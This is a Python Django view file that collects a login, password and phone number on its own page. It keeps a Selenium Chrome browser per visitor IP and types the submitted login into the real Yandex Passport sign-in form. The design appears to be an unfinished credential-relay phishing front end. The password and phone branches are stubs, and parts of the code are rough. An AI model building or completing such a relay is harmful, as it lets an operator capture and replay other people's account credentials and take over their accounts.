import asyncio
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from asgiref.sync import sync_to_async

class User:
    def __init__(self, login=None, password=None, phone=None, driver=None):
        self.login = login
        self.password = password
        self.phone = phone
        self.driver = driver

selenium_drivers = {}

async def index(request):
    client_ip = request.META.get('REMOTE_ADDR')
    driver = await get_driver(request, client_ip)

    if request.method == 'POST':

        if driver is not None and driver.current_window_handle:
            login = request.POST.get('login')
            password = request.POST.get('password')
            phone = request.POST.get('phone')

            if password:
                pass
            elif login:
                await asyncio.to_thread(open_yandex_passport, driver)
                username_login = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, 'passp-field-login'))
                )
                login_submit = driver.find_element(By.ID, "passp:sign-in")
                username_login.send_keys(login)
                login_submit.click()
                new_user = User(login=login)
                return await sync_to_async(render)(request, 'welcome.html',
                                                   {'login_name': username_login.get_attribute('value')})

            elif phone:
                new_user = User(phone=phone)
            else:
                messages.error(request, 'Please enter login or phone')
                return await sync_to_async(render)(request, 'index.html')

    return await sync_to_async(render)(request, 'index.html')


def create_selenium_driver():
    chrome_options = Options()
    chrome_options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(chrome_options=chrome_options)

    return driver

def open_yandex_passport(driver):
    driver.get("https://passport.yandex.ru")

async def get_driver(request, client_ip):
    if client_ip not in selenium_drivers:
        selenium_drivers[client_ip] = await asyncio.to_thread(create_selenium_driver)
    else:
        driver = selenium_drivers[client_ip]
        if not driver.current_window_handle:
            driver.quit()
            selenium_drivers[client_ip] = await asyncio.to_thread(create_selenium_driver)
    return selenium_drivers[client_ip]
